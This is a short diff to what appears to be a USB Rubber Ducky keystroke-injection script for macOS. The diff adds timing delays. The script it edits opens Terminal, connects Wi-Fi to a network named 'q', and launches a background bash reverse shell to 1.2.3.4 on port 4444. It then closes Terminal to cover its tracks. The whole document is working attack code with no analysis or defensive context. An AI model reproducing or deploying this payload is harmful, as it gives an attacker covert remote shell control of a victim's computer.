@@ -1,8 +1,12 @@
+DELAY 100
 GUI SPACE
+DELAY 100
 STRING terminal
 DELAY 500
 ENTER
 DELAY 500
 STRING networksetup -setairportpower en1 on;networksetup -setairportnetwork en1 q quick&bash &> /dev/tcp/1.2.3.4/4444 0>&1 &
+DELAY 100
 ENTER
+DELAY 100
 GUI q
